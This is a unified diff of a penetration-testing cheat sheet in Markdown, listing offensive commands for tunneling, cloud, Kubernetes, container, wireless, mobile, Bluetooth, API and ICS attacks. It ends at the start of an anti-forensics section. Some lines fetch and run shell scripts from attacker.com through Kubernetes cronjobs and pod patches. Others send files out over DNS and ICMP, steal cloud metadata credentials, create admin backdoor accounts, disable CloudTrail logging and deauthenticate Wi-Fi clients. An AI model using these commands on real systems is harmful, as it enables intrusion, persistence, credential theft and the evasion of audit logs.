-# Use Case: HTTP-based SOCKS proxy
-# Explanation: Creates SOCKS proxy through web shell
+# Use: HTTP proxy - creates SOCKS proxy through web shell
 
-# Chisel Tunneling
-# Server (Attacker)
+# Chisel tunneling
 ./chisel server -p 8080 --reverse
-# Use Case: TCP/UDP tunneling
-# Explanation: Sets up chisel server for tunneling
+# Use: TCP tunneling - versatile TCP/UDP tunneling
 
-# Client (Target)
 ./chisel client 10.10.10.10:8080 R:1080:socks
-# Use Case: SOCKS proxy creation
-# Explanation: Creates SOCKS proxy through tunnel
+# Use: SOCKS proxy - creates proxy through tunnel
 
-./chisel client 10.10.10.10:8080 R:2222:172.16.1.100:22
-# Use Case: Port forwarding
-# Explanation: Forwards specific ports through tunnel
-
-# SSH Tunneling
+# SSH tunneling
 ssh -D 1080 -p 22 user@target_ip
-# Use Case: Dynamic port forwarding
-# Explanation: Creates SOCKS proxy through SSH
+# Use: Dynamic forwarding - SOCKS proxy through SSH
 
 ssh -L 8080:internal_host:80 user@target_ip
-# Use Case: Local port forwarding
-# Explanation: Forwards local port to remote service
+# Use: Local forwarding - forwards local port to remote
 
 ssh -R 2222:127.0.0.1:22 user@attacker_ip
-# Use Case: Remote port forwarding
-# Explanation: Exposes local service to remote host
+# Use: Remote forwarding - exposes local service to remote
+```
 
-ICMP & Protocol Tunneling
-bash
-# ptunnel-ng ICMP Tunneling
-# Server (Attacker)
-ptunnel-ng -x password -p 22 -l 2222
-# Use Case: ICMP-based tunneling
-# Explanation: Creates tunnel through ICMP packets
+---
 
-# Client (Target)
-ptunnel-ng -x password -p target_ip:22 -l 1080 -r attacker_ip:2222
-# Use Case: ICMP tunnel client
-# Explanation: Connects to ICMP tunneling server
+## 11. Cloud Security
 
-# ICMPExfil Data Exfiltration
-python icmpexfil.py -s 10.10.10.10 -f secret.txt
-# Use Case: Data exfiltration via ICMP
-# Explanation: Sends files through ICMP packets
-
-# DNSExfil Data Exfiltration
-python dns_exfil.py --file secret.txt --domain attacker.com
-# Use Case: Data exfiltration via DNS
-# Explanation: Encodes data in DNS queries
-
-11.CLOUD SECURITY
-
-11.1 AWS Exploitation
-
-AWS Reconnaissance & Enumeration
-bash
-# AWS CLI Basic Reconnaissance
+### AWS Exploitation
+```bash
+# AWS reconnaissance
 aws sts get-caller-identity
-# Use Case: Current user/role identification
-# Explanation: Shows current AWS identity information
+# Use: Identity check - shows current AWS identity
 
 aws iam list-users
 aws iam list-roles
 aws iam list-groups
-# Use Case: IAM user/role enumeration
-# Explanation: Lists IAM users, roles, and groups
-
-aws iam list-attached-user-policies --user-name target-user
-aws iam list-user-policies --user-name target-user
-# Use Case: User policy enumeration
-# Explanation: Shows policies attached to specific users
+# Use: IAM enumeration - lists users, roles, and groups
 
 aws ec2 describe-instances
 aws ec2 describe-security-groups
-aws ec2 describe-vpcs
-# Use Case: EC2 infrastructure enumeration
-# Explanation: Lists EC2 instances, security groups, and VPCs
+# Use: EC2 enumeration - lists instances and security groups
 
 aws s3 ls
 aws s3api list-buckets
-# Use Case: S3 bucket discovery
-# Explanation: Lists available S3 buckets
+# Use: S3 enumeration - lists S3 buckets
 
-# Pacu AWS Exploitation Framework
+# Pacu framework
 run aws__enumeration
-# Use Case: Automated AWS enumeration
-# Explanation: Runs comprehensive AWS reconnaissance
+# Use: Automated enumeration - comprehensive AWS recon
 
 run iam__privesc_scan
-# Use Case: IAM privilege escalation scanning
-# Explanation: Identifies IAM privilege escalation paths
+# Use: Privilege escalation - finds IAM escalation paths
 
 run iam__backdoor_users
-# Use Case: IAM user backdooring
-# Explanation: Creates backdoor IAM users
+# Use: Backdoor creation - creates backdoor IAM users
 
-run s3__bucket_finder
-# Use Case: S3 bucket discovery and analysis
-# Explanation: Finds and analyzes S3 buckets
-
-AWS Privilege Escalation
-bash
-# IAM Privilege Escalation Techniques
+# AWS privilege escalation
 aws iam create-user --user-name backdoor-user
-# Use Case: Creating backdoor users
-# Explanation: Creates new IAM user for persistence
-
 aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-# Use Case: Granting administrative privileges
-# Explanation: Attaches administrator policy to user
-
-aws iam create-access-key --user-name backdoor-user
-# Use Case: Creating access keys
-# Explanation: Generates access keys for programmatic access
+# Use: User creation - creates admin user
 
 aws iam update-assume-role-policy --role-name target-role --policy-document file://trust-policy.json
-# Use Case: Role trust policy modification
-# Explanation: Modifies role trust relationships
+# Use: Role modification - changes role trust policies
 
-# Lambda Backdoors
+# Lambda backdoors
 aws lambda create-function --function-name BackdoorFunction --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://backdoor.zip
-# Use Case: Lambda function backdoor
-# Explanation: Creates malicious Lambda function
+# Use: Lambda persistence - creates malicious Lambda function
 
-aws events put-rule --name "DailyTrigger" --schedule-expression "rate(1 day)"
-aws events put-targets --rule "DailyTrigger" --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:BackdoorFunction"
-# Use Case: Scheduled Lambda execution
-# Explanation: Triggers Lambda function on schedule
-
-AWS Persistence Techniques
-bash
-# EC2 Instance Backdooring
-aws ec2 run-instances --image-id ami-12345678 --count 1 --instance-type t2.micro --key-name backdoor-key --security-group-ids sg-12345678 --subnet-id subnet-12345678 --user-data file://userdata.sh
-# Use Case: Malicious EC2 instance creation
-# Explanation: Creates EC2 instance with backdoor user data
-
-# CloudTrail Log Manipulation
-aws cloudtrail stop-logging --name trail-name
-# Use Case: Disabling CloudTrail logging
-# Explanation: Stops CloudTrail logging to evade detection
-
-aws cloudtrail delete-trail --name trail-name
-# Use Case: Removing CloudTrail trails
-# Explanation: Deletes CloudTrail configuration
-
-# IAM Role Persistence
-aws iam create-role --role-name BackdoorRole --assume-role-policy-document file://trust-policy.json
-aws iam attach-role-policy --role-name BackdoorRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-# Use Case: Backdoor role creation
-# Explanation: Creates persistent IAM roles with high privileges
-
-S3 Bucket Exploitation
-bash
-# S3 Bucket Enumeration
+# S3 exploitation
 aws s3 ls s3://target-bucket/ --no-sign-request
-# Use Case: Public bucket discovery
-# Explanation: Lists contents of publicly accessible buckets
+# Use: Public buckets - lists publicly accessible buckets
 
 aws s3 sync s3://target-bucket/ ./local-folder/ --no-sign-request
-# Use Case: S3 bucket data exfiltration
-# Explanation: Downloads entire bucket contents
+# Use: Data exfiltration - downloads bucket contents
 
-aws s3 cp s3://target-bucket/secret.txt ./
-# Use Case: Specific file download
-# Explanation: Downloads individual files from S3
-
-# S3 Bucket Manipulation
 aws s3 cp malicious-file.txt s3://target-bucket/
-# Use Case: S3 bucket upload
-# Explanation: Uploads files to writable buckets
+# Use: Data injection - uploads files to buckets
 
-aws s3api put-bucket-acl --bucket target-bucket --acl public-read-write
-# Use Case: S3 bucket ACL modification
-# Explanation: Changes bucket permissions to public
+# CloudTrail evasion
+aws cloudtrail stop-logging --name trail-name
+# Use: Log disabling - stops CloudTrail logging
 
-11.2 Azure AD Attacks
+aws cloudtrail delete-trail --name trail-name
+# Use: Trail deletion - removes CloudTrail configuration
 
-Azure AD Reconnaissance
-powershell
-# Azure AD Module Commands
+# Metadata exploitation
+curl http://169.254.169.254/latest/meta-data/
+# Use: Instance metadata - gets EC2 instance metadata
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Use: IAM roles - lists available IAM roles
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+# Use: Temporary credentials - gets role credentials
+```
+
+### Azure AD Attacks
+```bash
+# Azure AD reconnaissance
 Connect-AzureAD
-# Use Case: Azure AD connection
-# Explanation: Connects to Azure Active Directory
+# Use: Azure connection - connects to Azure Active Directory
 
 Get-AzureADUser -All $true | Select-Object DisplayName, UserPrincipalName
-# Use Case: User enumeration
-# Explanation: Lists all Azure AD users
+# Use: User enumeration - lists Azure AD users
 
 Get-AzureADDirectoryRole | ForEach-Object {Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId}
-# Use Case: Role membership enumeration
-# Explanation: Lists members of Azure AD roles
+# Use: Role enumeration - lists role members
 
 Get-AzureADApplication -All $true
 Get-AzureADServicePrincipal -All $true
-# Use Case: Application and service principal enumeration
-# Explanation: Lists Azure AD applications and service principals
+# Use: App enumeration - lists applications and service principals
 
-# MicroBurst Azure Exploitation Framework
+# MicroBurst framework
 Get-AzurePasswords -Verbose
-# Use Case: Azure credential harvesting
-# Explanation: Attempts to extract passwords from Azure
+# Use: Credential harvesting - attempts password extraction
 
 Invoke-EnumerateAzureBlobs -Base company
-# Use Case: Azure storage enumeration
-# Explanation: Discovers Azure storage accounts and containers
+# Use: Storage enumeration - finds Azure storage accounts
 
-Get-AzureDomainInfo
-# Use Case: Azure domain information gathering
-# Explanation: Collects Azure AD domain information
-
-Azure Privilege Escalation
-powershell
-# Azure Role Assignment
+# Azure privilege escalation
 Add-AzureADRoleMember -ObjectId "role-id" -RefObjectId "user-id"
-# Use Case: Azure role assignment
-# Explanation: Adds users to Azure AD roles
+# Use: Role assignment - adds users to Azure AD roles
 
 New-AzureADServicePrincipal -DisplayName "BackdoorApp"
-# Use Case: Service principal creation
-# Explanation: Creates backdoor service principals
+# Use: Service principal - creates backdoor application
 
-# Runbook Persistence
+# Runbook persistence
 Import-AzAutomationRunbook -Name "BackdoorRunbook" -Path "C:\backdoor.ps1" -AutomationAccountName "Account" -ResourceGroupName "RG" -Type PowerShell
-# Use Case: Automation runbook persistence
-# Explanation: Creates malicious automation runbooks
+# Use: Automation persistence - creates malicious runbooks
 
-Publish-AzAutomationRunbook -AutomationAccountName "Account" -ResourceGroupName "RG" -Name "BackdoorRunbook"
-# Use Case: Runbook publication
-# Explanation: Publishes runbook for execution
-
-# Function App Backdoors
+# Function app backdoors
 az functionapp create --name BackdoorFunction --storage-account mystorageaccount --resource-group myResourceGroup --consumption-plan-location westus
-# Use Case: Azure Function backdoor
-# Explanation: Creates malicious Azure Functions
+# Use: Function persistence - creates Azure Functions
 
-Azure Storage Exploitation
-bash
-# Azure Storage Account Enumeration
+# Storage exploitation
 az storage account list --resource-group myResourceGroup
-# Use Case: Storage account discovery
-# Explanation: Lists Azure storage accounts
+# Use: Storage enumeration - lists storage accounts
 
 az storage container list --account-name mystorageaccount --account-key mykey
-# Use Case: Container enumeration
-# Explanation: Lists containers in storage account
+# Use: Container enumeration - lists storage containers
 
-# Storage Account Access
 az storage blob download --account-name mystorageaccount --container-name mycontainer --name myblob --file ./localfile
-# Use Case: Blob storage access
-# Explanation: Downloads files from Azure blob storage
+# Use: Blob access - downloads files from blob storage
 
-az storage blob upload --account-name mystorageaccount --container-name mycontainer --name myblob --type block --file ./localfile
-# Use Case: Blob storage upload
-# Explanation: Uploads files to Azure blob storage
+# Metadata service
+curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+# Use: Azure metadata - gets Azure VM metadata
 
-11.3 Kubernetes Security
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"
+# Use: Managed identity - gets access tokens for managed identities
+```
 
-Kubernetes Reconnaissance
-bash
-# Basic Kubernetes Enumeration
+### Kubernetes Security
+```bash
+# Kubernetes reconnaissance
 kubectl get pods --all-namespaces
-# Use Case: Pod discovery
-# Explanation: Lists all pods in all namespaces
+# Use: Pod discovery - lists all pods
 
 kubectl get secrets --all-namespaces
-# Use Case: Secret enumeration
-# Explanation: Lists Kubernetes secrets
+# Use: Secret enumeration - lists Kubernetes secrets
 
 kubectl get configmaps --all-namespaces
-# Use Case: ConfigMap enumeration
-# Explanation: Lists configuration maps
+# Use: ConfigMap enumeration - lists configuration maps
 
 kubectl get services --all-namespaces
-# Use Case: Service discovery
-# Explanation: Lists Kubernetes services
+# Use: Service discovery - lists services
 
 kubectl get roles --all-namespaces
 kubectl get rolebindings --all-namespaces
 kubectl get clusterroles
 kubectl get clusterrolebindings
-# Use Case: RBAC enumeration
-# Explanation: Lists roles and role bindings
+# Use: RBAC enumeration - lists roles and bindings
 
-# Advanced Kubernetes Enumeration
 kubectl auth can-i --list
-# Use Case: Permission enumeration
-# Explanation: Shows current user permissions
+# Use: Permission check - shows current user permissions
 
-kubectl get nodes -o yaml
-# Use Case: Node information
-# Explanation: Gets detailed node information
-
-Kubernetes Privilege Escalation
-bash
-# Privilege Escalation Techniques
+# Kubernetes privilege escalation
 kubectl create rolebinding privileged-role-binding --user=system:serviceaccount:default:default --clusterrole=cluster-admin
-# Use Case: Service account privilege escalation
-# Explanation: Grants cluster-admin to service account
+# Use: Role binding - grants cluster-admin to service account
 
 kubectl patch pod my-pod -p '{"spec":{"containers":[{"name":"my-container","image":"alpine","command":["/bin/sh"],"args":["-c","curl http://attacker.com/shell.sh | sh"]}]}}'
-# Use Case: Pod command injection
-# Explanation: Modifies pod specifications for code execution
+# Use: Pod modification - changes pod specification
 
 kubectl exec -it my-pod -- /bin/bash
-# Use Case: Pod command execution
-# Explanation: Executes commands in running pods
+# Use: Pod execution - executes commands in pods
 
-# Kubernetes Backdoors
+# Kubernetes backdoors
 kubectl create secret generic backdoor-secret --from-literal=token=supersecret
-# Use Case: Secret creation for persistence
-# Explanation: Creates secrets for storing backdoor data
+# Use: Secret creation - stores backdoor data
 
 kubectl create cronjob backdoor-job --image=alpine --schedule="*/5 * * * *" -- /bin/sh -c "curl http://attacker.com/payload.sh | sh"
-# Use Case: CronJob persistence
-# Explanation: Creates scheduled jobs for persistence
+# Use: CronJob persistence - creates scheduled jobs
 
-Container Escape Techniques
-bash
-# Privileged Container Escape
+# Container escape
 docker run --privileged -v /:/host -it alpine chroot /host /bin/sh
-# Use Case: Privileged container escape
-# Explanation: Escapes to host from privileged container
+# Use: Privileged escape - escapes privileged containers
 
-# Docker Socket Escape
 docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
-# Use Case: Docker socket escape
-# Explanation: Uses Docker socket to control host Docker daemon
+# Use: Docker socket - controls host Docker daemon
 
-# Capabilities-based Escape
 docker run --cap-add=ALL -v /:/host -it alpine chroot /host /bin/sh
-# Use Case: Capability-based escape
-# Explanation: Uses container capabilities for host access
+# Use: Capabilities escape - uses container capabilities
 
-# Kubernetes Node Compromise
 kubectl debug node/node-name -it --image=alpine
-# Use Case: Node debugging escape
-# Explanation: Uses Kubernetes node debugging for host access
+# Use: Node debug - escapes to host through node debugging
+```
 
-11.4 Cloud Metadata API Exploitation
+---
 
-AWS Instance Metadata
-bash
-# EC2 Metadata Enumeration
-curl http://169.254.169.254/latest/meta-data/
-# Use Case: Instance metadata discovery
-# Explanation: Lists available metadata categories
+## 12. Container Security
 
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-# Use Case: IAM role discovery
-# Explanation: Lists available IAM roles
+### Container Vulnerability Scanning
+```bash
+# Trivy
+trivy image alpine:3.12
+# Use: Image scanning - checks container images for vulnerabilities
 
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
-# Use Case: Temporary credential retrieval
-# Explanation: Gets temporary security credentials
+trivy filesystem --security-checks vuln,secret /
+# Use: Filesystem scanning - checks local filesystem
 
-curl http://169.254.169.254/latest/user-data
-# Use Case: User data retrieval
-# Explanation: Gets instance user data
+trivy kubernetes --report summary all
+# Use: Kubernetes scanning - scans Kubernetes clusters
 
-# Advanced Metadata Attacks
-TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
-# Use Case: IMDSv2 token-based access
-# Explanation: Uses IMDSv2 tokens for metadata access
+# Falco
+falco -r rules.yaml -o file_output.enabled=true
+# Use: Runtime security - monitors container behavior
 
-Azure Instance Metadata
-bash
-# Azure Metadata Service
-curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-# Use Case: Azure instance metadata
-# Explanation: Gets Azure VM instance metadata
+# Kube-hunter
+kube-hunter --remote target.com
+# Use: Kubernetes pentesting - tests Kubernetes security
 
-curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"
-# Use Case: Managed identity token retrieval
-# Explanation: Gets access tokens for managed identities
+kube-hunter --active --cidr 10.0.0.0/8
+# Use: Network scanning - scans for Kubernetes services
+```
 
-Google Cloud Metadata
-bash
-# GCP Metadata Service
-curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/"
-# Use Case: GCP instance metadata
-# Explanation: Lists GCP metadata endpoints
+### Container Runtime Security
+```bash
+# Docker security assessment
+docker image ls
+# Use: Image listing - shows available images
 
-curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
-# Use Case: Service account token retrieval
-# Explanation: Gets access tokens for service accounts
+docker ps -a
+# Use: Container listing - shows running and stopped containers
 
-12.MOBILE & WIRELESS
+docker network ls
+# Use: Network listing - shows Docker networks
 
-12.1 Wireless Attacks
+# Container breakout testing
+docker run --privileged --security-opt apparmor:unconfined --cap-add=ALL -it ubuntu bash
+# Use: Privileged container - tests privilege escalation
 
-Aircrack-ng Suite
-bash
-# Wireless Interface Setup
+# Runtime hardening checks
+docker info --format '{{.SecurityOptions}}'
+# Use: Security options - shows Docker security configuration
+```
+
+---
+
+## 13. Mobile & Wireless
+
+### Wireless Attacks
+```bash
+# Aircrack-ng suite
 airmon-ng start wlan0
-# Use Case: Monitor mode activation
-# Explanation: Puts wireless interface in monitor mode
+# Use: Monitor mode - enables wireless monitoring
 
 airmon-ng check kill
-# Use Case: Process killing
-# Explanation: Stops processes that interfere with monitoring
+# Use: Process killing - stops interfering processes
 
-# Wireless Network Discovery
 airodump-ng wlan0mon
-# Use Case: Wireless network reconnaissance
-# Explanation: Discovers nearby wireless networks
+# Use: Network discovery - finds nearby wireless networks
 
 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
-# Use Case: Targeted network capture
-# Explanation: Captures packets from specific network
+# Use: Targeted capture - captures specific network traffic
 
-# WPA/WPA2 Handshake Capture
 aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
-# Use Case: Deauthentication attack
-# Explanation: Forces clients to reconnect and capture handshake
+# Use: Deauthentication - forces clients to reconnect
 
-# WPA/WPA2 Cracking
 aircrack-ng -w wordlist.txt capture-01.cap
-# Use Case: Password cracking
-# Explanation: Cracks WPA/WPA2 passwords from captured handshake
+# Use: WPA cracking - cracks WPA handshakes
 
-# WEP Cracking
-aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
-# Use Case: WEP encryption cracking
-# Explanation: Cracks WEP keys from captured packets
-
-WPA3 & Advanced Wireless Attacks
-bash
-# PMKID Attack with hcxdumptool
+# WPA3 & advanced attacks
 hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
-# Use Case: PMKID capture without deauth
-# Explanation: Captures PMKID for offline cracking
+# Use: PMKID capture - captures without deauthentication
 
 hcxpcaptool -z hashes.txt capture.pcapng
-# Use Case: Hash extraction
-# Explanation: Extracts hashes from capture file
+# Use: Hash extraction - extracts hashes from capture
 
 hashcat -m 22000 hashes.txt wordlist.txt
-# Use Case: PMKID hash cracking
-# Explanation: Cracks PMKID hashes with hashcat
+# Use: PMKID cracking - cracks PMKID hashes
 
-# Evil Twin Attack
+# Evil twin attacks
 airbase-ng -a AA:BB:CC:DD:EE:FF --essid "Free WiFi" -c 6 wlan0mon
-# Use Case: Rogue access point
-# Explanation: Creates fake access point
+# Use: Rogue AP - creates fake access point
 
-# KARMA Attack
-airbase-ng -P -C 30 -c 6 --essid "KARMA" wlan0mon
-# Use Case: Client probing attacks
-# Explanation: Responds to all probe requests
-
-BetterCAP Wireless Attacks
-bash
-# WiFi Reconnaissance
+# BetterCAP wireless
 bettercap -iface wlan0
 wifi.recon on
 wifi.show
-# Use Case: Wireless network discovery
-# Explanation: Discovers and displays wireless networks
+# Use: Wireless recon - discovers networks
 
-# WiFi Deauthentication
 set wifi.deauth.essid TargetNetwork
 wifi.deauth
-# Use Case: Targeted deauthentication
-# Explanation: Deauthenticates clients from specific network
+# Use: Targeted deauth - deauthenticates from specific network
+```
 
-# Rogue AP with BetterCAP
-set wifi.ap.ssid FreeWiFi
-set wifi.ap.bssid AA:BB:CC:DD:EE:FF
-set wifi.ap.channel 6
-wifi.recon on
-wifi.ap
-# Use Case: Rogue access point creation
-# Explanation: Creates fake access point for attacks
-
-12.2 Mobile Application Testing
-
-Objection - Runtime Mobile Assessment
-bash
-# iOS Application Testing
+### Mobile Application Testing
+```bash
+# Objection
 objection -g com.app.name explore
-# Use Case: iOS app runtime analysis
-# Explanation: Injects into iOS application for testing
+# Use: Runtime analysis - injects into mobile apps
 
 ios keychain dump
-# Use Case: iOS keychain extraction
-# Explanation: Dumps iOS keychain entries
-
-ios nsurlcredentialstorage dump
-# Use Case: Credential storage dumping
-# Explanation: Extracts stored credentials
-
-ios ui screenshot /tmp/screen.png
-# Use Case: Screenshot capture
-# Explanation: Takes screenshots of running app
-
-# Android Application Testing
-objection -g com.android.app explore
-# Use Case: Android app runtime analysis
-# Explanation: Injects into Android application
+# Use: iOS keychain - extracts keychain entries
 
 android keystore list
-# Use Case: Android keystore enumeration
-# Explanation: Lists Android keystore entries
-
-android hooking list activities
-# Use Case: Activity enumeration
-# Explanation: Lists Android activities
+# Use: Android keystore - lists keystore entries
 
 android hooking watch class_method com.app.Class.method --dump-args --dump-return
-# Use Case: Method hooking
-# Explanation: Monitors method calls and parameters
+# Use: Method hooking - monitors method calls
 
-Frida - Dynamic Instrumentation
-javascript
-// Frida Script Examples
-// SSL Pinning Bypass
-Java.perform(function() {
-    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
-    TrustManager.checkServerTrusted.implementation = function(chain, authType) {
-        console.log("SSL Bypass: " + chain);
-    };
-});
-
-// Crypto Hooking
-Java.perform(function() {
-    var CryptoClass = Java.use("com.example.Crypto");
-    CryptoClass.encrypt.implementation = function(data) {
-        console.log("Encrypting: " + data);
-        var result = this.encrypt(data);
-        console.log("Result: " + result);
-        return result;
-    };
-});
-
-// Root Detection Bypass
-Java.perform(function() {
-    var RootCheck = Java.use("com.example.RootCheck");
-    RootCheck.isRooted.implementation = function() {
-        console.log("Root check bypassed");
-        return false;
-    };
-});
-
-// Frida Usage
+# Frida
 frida -U -f com.app.name -l script.js --no-pause
-# Use Case: App instrumentation
-# Explanation: Injects Frida scripts into running app
+# Use: Dynamic instrumentation - injects Frida scripts
 
-MobSF - Mobile Security Framework
-bash
-# Static Analysis
+# MobSF
 python3 manage.py runserver 0.0.0.0:8000
-# Use Case: Web-based mobile app analysis
-# Explanation: Runs MobSF web interface for static analysis
+# Use: Web interface - runs MobSF for static analysis
 
-# Dynamic Analysis Setup
-docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
-# Use Case: Containerized MobSF deployment
-# Explanation: Runs MobSF in Docker container
-
-# API Usage
 curl -X POST -F "file=@app.apk" http://localhost:8000/api/v1/upload
-curl -X GET "http://localhost:8000/api/v1/report?hash=APP_HASH"
-# Use Case: Automated mobile app testing
-# Explanation: Uses MobSF API for integration
+# Use: API usage - uploads apps via API
 
-APKTool & Reverse Engineering
-bash
-# APK Decompilation
+# APKTool & reverse engineering
 apktool d app.apk -o decompiled/
-# Use Case: APK reverse engineering
-# Explanation: Decompiles APK to smali code
+# Use: APK decompilation - decompiles to smali code
 
 apktool b decompiled/ -o modified.apk
-# Use Case: APK repackaging
-# Explanation: Rebuilds modified APK
+# Use: APK repackaging - rebuilds modified APK
 
-# JADX Decompilation
 jadx -d decompiled/ app.apk
-# Use Case: Java source code recovery
-# Explanation: Decompiles APK to Java source
+# Use: Java decompilation - decompiles to Java source
 
-# Signing Modified APK
+# APK signing
 keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore modified.apk alias_name
-# Use Case: APK signing for installation
-# Explanation: Creates certificate and signs APK
+# Use: APK signing - signs APKs for installation
+```
 
-12.3 Bluetooth Attacks
-
-Bluetooth Reconnaissance
-bash
-# Bluetooth Device Discovery
+### Bluetooth Attacks
+```bash
+# Bluetooth reconnaissance
 hcitool scan
-# Use Case: Bluetooth device discovery
-# Explanation: Scans for nearby Bluetooth devices
+# Use: Device discovery - finds nearby Bluetooth devices
 
 hcitool inq
-# Use Case: Extended device discovery
-# Explanation: Performs extended device inquiry
+# Use: Extended discovery - performs device inquiry
 
 bluetoothctl
-# Use Case: Bluetooth control interface
-# Explanation: Interactive Bluetooth management
+# Use: Bluetooth control - interactive management
 
-# Bluetooth Service Discovery
 sdptool browse AA:BB:CC:DD:EE:FF
-# Use Case: Service enumeration
-# Explanation: Lists services on Bluetooth device
+# Use: Service discovery - lists Bluetooth services
 
-# Bluetooth Sniffing
+# Bluetooth sniffing
 ubertooth-btle -f -r capture.pcap
-# Use Case: Bluetooth Low Energy sniffing
-# Explanation: Captures BLE communications
+# Use: BLE sniffing - captures BLE communications
 
 hcidump -Xt
-# Use Case: HCI packet capture
-# Explanation: Captures Host Controller Interface packets
+# Use: HCI capture - captures Host Controller Interface
 
-Bluetooth Exploitation
-bash
-# BlueBorne Attacks
+# Bluetooth exploitation
 python blueborne.py -t AA:BB:CC:DD:EE:FF
-# Use Case: BlueBorne vulnerability exploitation
-# Explanation: Exploits BlueBorne vulnerabilities
+# Use: BlueBorne - exploits BlueBorne vulnerabilities
 
-# L2CAP Attacks
 l2ping -s 1000 -f AA:BB:CC:DD:EE:FF
-# Use Case: L2CAP ping flood
-# Explanation: Sends L2CAP ping packets for testing
+# Use: L2CAP ping - sends ping packets
 
-# Bluetooth PIN Cracking
 btcrack AA:BB:CC:DD:EE:FF capture.cap wordlist.txt
-# Use Case: Bluetooth PIN cracking
-# Explanation: Attempts to crack Bluetooth PINs
+# Use: PIN cracking - cracks Bluetooth PINs
 
-# GATT Exploitation
 gatttool -b AA:BB:CC:DD:EE:FF -I
 connect
 char-read-hnd 0x000c
-# Use Case: GATT service interaction
-# Explanation: Interacts with GATT services and characteristics
+# Use: GATT interaction - interacts with GATT services
+```
 
-13.ANTI-FORENSICS
+---
 
-13.1 Log Manipulation
+## 14. API Security
 
-Linux Log Cleaning
-bash
-# Clear Specific Log Files
+### API Testing Tools
+```bash
+# RESTler
+python3 restler.py --api_spec openapi.json --target_ip 10.10.10.10 --target_port 443
+# Use: API fuzzing - automated API testing with grammar
+
+# APIsec
+apisec scan --config apisec-config.yaml --url https://api.target.com
+# Use: Automated scanning - comprehensive API security testing
+
+# Schemathesis
+st run --checks all https://api.target.com/openapi.json
+# Use: Property-based testing - generates test cases from schema
+```
+
+### Advanced API Attacks
+```bash
+# GraphQL advanced testing
+python3 graphql-cop -t https://target.com/graphql
+# Use: GraphQL security - comprehensive GraphQL testing
+
+# API abuse testing
+for i in {1..1000}; do curl -X POST https://api.target.com/endpoint -d "data=test$i"; done
+# Use: Rate limit testing - checks API rate limiting
+
+# JWT advanced attacks
+python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt
+# Use: JWT cracking - brute forces JWT secrets
+```
+
+---
+
+## 15. DevSecOps Tools
+
+### SAST & Code Analysis
+```bash
+# Semgrep
+semgrep --config=auto .
+# Use: Code scanning - finds bugs and vulnerabilities
+
+semgrep --config=p/ci .
+# Use: CI integration - security scanning for CI/CD
+
+# Grype
+grype alpine:latest
+# Use: Vulnerability scanning - container image analysis
+
+grype dir:.
+# Use: Directory scanning - local filesystem analysis
+
+# Syft
+syft alpine:latest -o json
+# Use: SBOM generation - software bill of materials
+
+syft dir:. -o cyclonedx
+# Use: SBOM formats - generates in various formats
+```
+
+### IaC Security
+```bash
+# Checkov
+checkov -d .
+# Use: Infrastructure scanning - checks CloudFormation, Terraform
+
+checkov -f cloudformation.yaml
+# Use: CloudFormation scanning - AWS template security
+
+# Terrascan
+terrascan scan
+# Use: Terraform scanning - IaC security analysis
+
+# TFsec
+tfsec .
+# Use: Terraform security - specialized Terraform scanning
+```
+
+---
+
+## 16. ICS/SCADA Security
+
+### Industrial Control Systems
+```bash
+# s7scan
+python3 s7scan.py -t 10.10.10.10
+# Use: Siemens S7 - scans Siemens S7 PLCs
+
+# modscan
+python3 modscan.py -t 10.10.10.10
+# Use: Modbus scanning - finds Modbus devices
+
+# ISF (Industrial Exploitation Framework)
+use scanners/scanner/siemens/s7_comm
+set RHOSTS 10.10.10.0/24
+run
+# Use: Industrial pentesting - exploits industrial protocols
+```
+
+---
+
+## 17. Zero Trust & Modern Security
+
+### Zero Trust Testing
+```bash
+# ZTNA testing
+python3 ztna_tester.py --domain company.com --api-key $API_KEY
+# Use: Zero Trust assessment - tests ZTNA implementations
+
+# Service Mesh security
+istioctl analyze
+# Use: Istio analysis - checks Istio configuration
+
+istioctl experimental authz check
+# Use: Authorization checking - verifies authz policies
+
+# SPIFFE/SPIRE testing
+spire-agent api fetch x509
+# Use: SPIFFE verification - tests SPIFFE implementation
+```
+
+---
+
+## 18. AI/ML Security
+
+### AI/ML Security Testing
+```bash
+# Counterfit
+counterfit scan --target model.zip
+# Use: Adversarial attacks - tests ML model security
+
+# MLSecOps
+python3 model_scanner.py --model model.h5 --framework tensorflow
+# Use: Model scanning - checks ML models for vulnerabilities
+
+# Data poisoning detection
+python3 data_poisoning_detector.py --dataset data.csv
+# Use: Data integrity - detects poisoned training data
+```
+
+---
+
+## 19. Anti-Forensics
+
+### Log Manipulation
+```bash
+# Linux log cleaning
